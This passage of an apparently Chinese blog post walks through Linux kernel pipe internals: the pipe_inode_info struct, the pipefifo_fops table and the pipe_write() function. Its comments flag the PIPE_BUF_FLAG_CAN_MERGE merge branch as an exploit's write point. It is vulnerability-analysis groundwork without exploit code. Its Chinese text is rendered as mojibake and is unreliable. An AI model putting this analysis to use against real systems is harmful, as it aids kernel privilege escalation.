class="line"><span class="comment"> *@mutex: ä¿æŠ¤ä¸€åˆ‡çš„äº’æ–¥é”</span></span><br><span class="line"><span class="comment"> *@rd_wait: ç©ºç®¡é“ä¸­è¯»è€…çš„ç­‰å¾…ç‚¹</span></span><br><span class="line"><span class="comment"> *@wr_wait: æ»¡ç®¡é“ä¸­å†™è€…çš„ç­‰å¾…ç‚¹</span></span><br><span class="line"><span class="comment"> *@head: ç¼“å†²åŒºçš„ç”Ÿäº§ç‚¹</span></span><br><span class="line"><span class="comment"> *@tail: ç¼“å†²åŒºçš„æ¶ˆè´¹ç‚¹</span></span><br><span class="line"><span class="comment"> *@note_loss: ä¸‹ä¸€æ¬¡ read() åº”å½“æ’å…¥ä¸€ä¸ª data-lost æ¶ˆæ¯</span></span><br><span class="line"><span class="comment"> *@max_usage: åœ¨ç¯ä¸­ä½¿ç”¨çš„ slots çš„æœ€å¤§æ•°é‡</span></span><br><span class="line"><span class="comment"> *@ring_size: ç¼“å†²åŒºçš„æ€»æ•° (åº”å½“ä¸º 2 çš„å¹‚æ¬¡)</span></span><br><span class="line"><span class="comment"> *@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span></span><br><span class="line"><span class="comment"> *@tmp_page: ç¼“å­˜çš„å·²é‡Šæ”¾çš„é¡µé¢</span></span><br><span class="line"><span class="comment"> *@readers: ç®¡é“ä¸­ç°æœ‰çš„è¯»è€…æ•°é‡</span></span><br><span class="line"><span class="comment"> *@writers: ç®¡é“ä¸­ç°æœ‰çš„å†™è€…æ•°é‡</span></span><br><span class="line"><span class="comment"> *@files: å¼•ç”¨äº†è¯¥ç®¡é“çš„ file ç»“æ„ä½“æ•°é‡ (protected by -&gt;i_lock)</span></span><br><span class="line"><span class="comment"> *@r_counter: è¯»è€…è®¡æ•°å™¨</span></span><br><span class="line"><span class="comment"> *@w_counter: å†™è€…è®¡æ•°å™¨</span></span><br><span class="line"><span class="comment"> *@fasync_readers: reader side fasync</span></span><br><span class="line"><span class="comment"> *@fasync_writers: writer side fasync</span></span><br><span class="line"><span class="comment"> *@bufs: ç®¡é“ç¼“å†²åŒºå¾ªç¯æ•°ç»„</span></span><br><span class="line"><span class="comment"> *@user: åˆ›å»ºè¯¥ç®¡é“çš„ç”¨æˆ·</span></span><br><span class="line"><span class="comment"> *@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line"><span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="ç®¡é“å‡½æ•°è¡¨ï¼š"><a href="#ç®¡é“å‡½æ•°è¡¨ï¼š" class="headerlink" title="ç®¡é“å‡½æ•°è¡¨ï¼š"></a>ç®¡é“å‡½æ•°è¡¨ï¼š</h3><p>é˜…è¯» pipe ç³»ç»Ÿè°ƒç”¨æºç ï¼Œæ³¨æ„åˆ°å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()</span><br><span class="line">__do_pipe_flags()</span><br><span class="line">create_pipe_files()</span><br><span class="line">alloc_file_pseudo()</span><br></pre></td></tr></table></figure><p>åœ¨åˆ›å»ºç®¡é“æ–‡ä»¶çš„å‡½æ•° <code>create_pipe_files()</code> ä¸­ï¼Œä¼ å…¥ <code>alloc_file_pseudo()</code> çš„å‡½æ•°è¡¨ä¸º <code>pipefifo_fops</code>ï¼Œè¿™ä¾¿æ˜¯ç®¡é“ç›¸å…³çš„æ“ä½œçš„å‡½æ•°è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">create_pipe_files</span><span class="params">(<span class="keyword">struct</span> file **res, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">f = alloc_file_pseudo(inode, pipe_mnt, <span class="string">&quot;&quot;</span>,</span><br><span class="line">O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),</span><br><span class="line">&amp;pipefifo_fops);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°è¡¨ä¸­å®šä¹‰äº†æˆ‘ä»¬å¯¹ç®¡é“çš„ç›¸å…³æ“ä½œä¼šè°ƒç”¨åˆ°çš„å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">.open= fifo_open,</span><br><span class="line">.llseek= no_llseek,</span><br><span class="line">.read_iter= pipe_read,</span><br><span class="line">.write_iter= pipe_write,</span><br><span class="line">.poll= pipe_poll,</span><br><span class="line">.unlocked_ioctl= pipe_ioctl,</span><br><span class="line">.release= pipe_release,</span><br><span class="line">.fasync= pipe_fasync,</span><br><span class="line">.splice_write= iter_file_splice_write,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="ç®¡é“çš„å†™å…¥è¿‡ç¨‹"><a href="#ç®¡é“çš„å†™å…¥è¿‡ç¨‹" class="headerlink" title="ç®¡é“çš„å†™å…¥è¿‡ç¨‹"></a>ç®¡é“çš„å†™å…¥è¿‡ç¨‹</h3><p>æŸ¥è¡¨ <code>pipefifo_fops</code> å¯çŸ¥å½“æˆ‘ä»¬å‘ç®¡é“å†…å†™å…¥æ•°æ®æ—¶ï¼Œæœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>pipe_write</code> å‡½æ•°ï¼Œå¤§æ¦‚æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>è‹¥ç®¡é“éç©ºä¸”ä¸Šä¸€ä¸ª buf æœªæ»¡ï¼Œåˆ™å…ˆå°è¯•å‘ä¸Šä¸€ä¸ªè¢«å†™å…¥çš„ bufferå†™å…¥æ•°æ®ï¼ˆè‹¥è¯¥ buffer è®¾ç½®äº†<code>PIPE_BUF_FLAG_CAN_MERGE</code> æ ‡å¿—ä½ï¼‰</li><li>æ¥ä¸‹æ¥å¼€å§‹å¯¹æ–°çš„ buffer è¿›è¡Œæ•°æ®å†™å…¥ï¼Œè‹¥æ²¡æœ‰<code>PIPE_BUF_FLAG_CAN_MERGE</code> æ ‡å¿—ä½åˆ™åˆ†é…æ–°é¡µé¢åå†™å…¥</li><li>å¾ªç¯ç¬¬äºŒæ­¥ç›´åˆ°å®Œæˆå†™å…¥ï¼Œè‹¥ç®¡é“æ»¡äº†åˆ™ä¼šå°è¯•å”¤é†’è¯»è€…è®©ç®¡é“è…¾å‡ºç©ºé—´</li></ul><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹å‡º <code>PIPE_BUF_FLAG_CAN_MERGE</code> <strong>ç”¨ä»¥æ ‡è¯†ä¸€ä¸ª pipe_buffer æ˜¯å¦å·²ç»åˆ†é…äº†å¯ä»¥å†™å…¥çš„ç©ºé—´</strong>ï¼Œåœ¨å¤§å¾ªç¯ä¸­è‹¥å¯¹åº” pipe_buffer æ²¡æœ‰è®¾ç½®è¯¥ flagï¼ˆåˆšè¢«åˆå§‹åŒ–ï¼‰ï¼Œåˆ™ä¼š<strong>æ–°åˆ†é…ä¸€ä¸ªé¡µé¢ä¾›å†™å…¥ï¼Œå¹¶è®¾ç½®è¯¥æ ‡å¿—ä½</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line"><span class="type">ssize_t</span> chars;</span><br><span class="line"><span class="type">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line"><span class="type">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Null write succeeds. */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) &#123;<span class="comment">// ç®¡é“æ²¡æœ‰è¯»è€…ï¼Œè¿”å›</span></span><br><span class="line">send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;watch_queue) &#123;</span><br><span class="line">ret = -EXDEV;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è‹¥ç®¡é“éç©ºï¼Œæˆ‘ä»¬å°è¯•å°†æ–°æ•°æ®åˆå¹¶åˆ°æœ€åä¸€ä¸ªbuffer ä¸­</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * è¿™è‡ªç„¶ä¼šåˆå¹¶å°çš„å†™æ“ä½œï¼Œä½†å…¶ä¹Ÿä¼šå¯¹</span></span><br><span class="line"><span class="comment"> * è·¨è¶Šå¤šä¸ªé¡µæ¡†çš„å¤§çš„å†™æ“ä½œçš„å‰©ä½™å†™å…¥æ“ä½œ</span></span><br><span class="line"><span class="comment"> * è¿›è¡Œé¡µé¢å¯¹é½</span></span><br><span class="line"><span class="comment"> * ï¼ˆè¯‘æ³¨ï¼šå¤§æ¦‚å°±æ˜¯å…ˆå°è¯•æŠŠæ•°æ®å†™åˆ°ç®¡é“çš„æœ€åä¸€ä¸ªbufferï¼ˆå¦‚æœå¯¹åº” page æ²¡å†™æ»¡çš„è¯ï¼‰ï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">head = pipe-&gt;head;<span class="comment">// è·å–é˜Ÿåˆ—å¤´</span></span><br><span class="line">was_empty = pipe_empty(head, pipe-&gt;tail); <span class="comment">// head == tail</span></span><br><span class="line">chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<span class="comment">// ç®¡é“éç©ºï¼Œä¸”ä¸Šä¸€ä¸ª buf æ²¡å†™æ»¡</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask]; <span class="comment">// æ‰¾åˆ°ä¸Šä¸€ä¸ª buf</span></span><br><span class="line"><span class="type">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * è®¾ç½®äº†PIPE_BUF_FLAG_CAN_MERGEæ ‡å¿—ä½ï¼Œ</span></span><br><span class="line"><span class="comment">         * è¯´æ˜è¯¥ buffer å¯ç”¨äºç›´æ¥å†™å…¥ï¼Œ</span></span><br><span class="line"><span class="comment">         * ç›´æ¥æŠŠæ•°æ®æ‹·è´è¿›å»åå°±è¿”å›</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">// æ³¨ï¼šè¿™æ˜¯æ¼æ´åˆ©ç”¨çš„å†™å…¥ç‚¹</span></span><br><span class="line"><span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret &lt; chars)) &#123;</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf-&gt;len += ret;</span><br><span class="line"><span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å†™æ»¡ last buffer å¯¹åº”æ•°æ®åï¼Œæ¥ä¸‹æ¥å°†å‰©ä½™æ•°æ®å†™åˆ°å¾€åçš„ buffer ä¸­</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) &#123;<span class="comment">// æ²¡æœ‰è¯»è€…ï¼Œè¿”å›</span></span><br><span class="line">send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123; <span class="comment">// ç®¡é“æ²¡æ»¡ï¼Œæ­£å¸¸å†™å…¥</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line"><span class="type">int</span> copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!page) &#123;<span class="comment">// æ²¡æœ‰é¢„å…ˆå‡†å¤‡pageï¼Œåˆ†é…ä¸€ä¸ªæ–°çš„</span></span><br><span class="line">page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">ret = ret ? : -ENOMEM;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pipe-&gt;tmp_page = page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* æå‰åœ¨ç¯ä¸­åˆ†é…ä¸€ä¸ª slotï¼Œå¹¶é™„åŠ ä¸€ä¸ªç©º bufferã€‚</span></span><br><span class="line"><span class="comment"> * è‹¥æˆ‘ä»¬å‡ºé”™æˆ–æœªèƒ½ä½¿ç”¨å®ƒï¼Œ</span></span><br><span class="line"><span class="comment"> * å®ƒä¼šè¢«è¯»è€…æ‰€ä½¿ç”¨ï¼Œ</span></span><br><span class="line"><span class="comment"> * äº¦æˆ–æ˜¯ä¿ç•™åœ¨è¿™é‡Œç­‰å¾…ä¸‹ä¸€æ¬¡å†™å…¥ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<span class="comment">// ç®¡é“æ»¡äº†ï¼Œå¼€å¯ä¸‹ä¸€æ¬¡å¾ªç¯</span></span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* å°†å…¶æ’å…¥ buffer array ä¸­ */</span></span><br><span class="line">buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (is_packetized(filp))<span class="comment">// è®¾ç½® buffer çš„ flagï¼Œè‹¥è®¾ç½®äº† O_DIRECT åˆ™ä¸º PACKET</span></span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from);<span class="comment">// å°†æ•°æ®æ‹·è´åˆ° buffer å¯¹åº” page ä¸Š</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ret += copied;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!iov_iter_count(from))<span class="comment">// è¯»å®Œæ•°æ®äº†ï¼Œé€€å‡ºå¾ªç¯</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))<span class="comment">// ç®¡é“æ²¡æ»¡ï¼Œç»§ç»­ä¸‹ä¸€æ¬¡å¾ªç¯</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ç­‰å¾…ç¼“å†²åŒºç©ºé—´å¯ç”¨. */</span></span><br><span class="line">        <span class="comment">// ç®¡é“æ»¡äº†ï¼Œç­‰ä»–å˜ç©º</span></span><br><span class="line"><span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EAGAIN;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -ERESTARTSYS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * æˆ‘ä»¬å°†é‡Šæ”¾ç®¡é“çš„é”ï¼Œç­‰å¾…ï¼ˆæœ‰ï¼‰æ›´å¤šçš„ç©ºé—´ã€‚</span></span><br><span class="line"><span class="comment"> * è‹¥æœ‰å¿…è¦æˆ‘ä»¬å°†å”¤é†’ä»»æ„è¯»è€…ï¼Œåœ¨ç­‰å¾…åæˆ‘ä»¬éœ€è¦é‡æ–°æ£€æŸ¥</span></span><br><span class="line"><span class="comment"> * åœ¨æˆ‘ä»¬é‡Šæ”¾é”åç®¡é“æ˜¯å¦å˜ç©ºäº†</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"><span class="keyword">if</span> (was_empty)</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);</span><br><span class="line">wake_next_writer = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">if</span> (pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line">wake_next_writer = <span class="literal">false</span>;</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è‹¥æˆ‘ä»¬è¿›è¡Œäº†ä¸€æ¬¡å”¤é†’äº‹ä»¶ï¼Œæˆ‘ä»¬åšä¸€ä¸ªâ€œåŒæ­¥â€å”¤é†’ï¼Œ</span></span><br><span class="line"><span class="comment"> * å› ä¸ºç›¸æ¯”èµ·è®©æ•°æ®ä»æ—§ç­‰å¾…ï¼Œæˆ‘ä»¬æƒ³è¦è®©è¯»è€…å»å°½å¿«</span></span><br><span class="line"><span class="comment"> * å¤„ç†äº‹æƒ…</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * å°¤å…¶æ˜¯ï¼Œè¿™å¯¹å°çš„å†™æ“ä½œé‡è¦ï¼Œè¿™æ˜¯å› ä¸ºï¼ˆä¾‹å¦‚ï¼‰GNU è®©</span></span><br><span class="line"><span class="comment"> * jobserver ä½¿ç”¨å°çš„å†™æ“ä½œæ¥å”¤é†’ç­‰å¾…çš„å·¥ä½œ</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Epoll åˆ™æ²¡æœ‰æ„ä¹‰åœ°æƒ³è¦ä¸€ä¸ªå”¤é†’ï¼Œ</span></span><br><span class="line"><span class="comment"> * æ— è®ºç®¡é“æ˜¯å¦å·²ç»ç©ºäº†</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (was_empty || pipe-&gt;poll_usage)</span><br><span 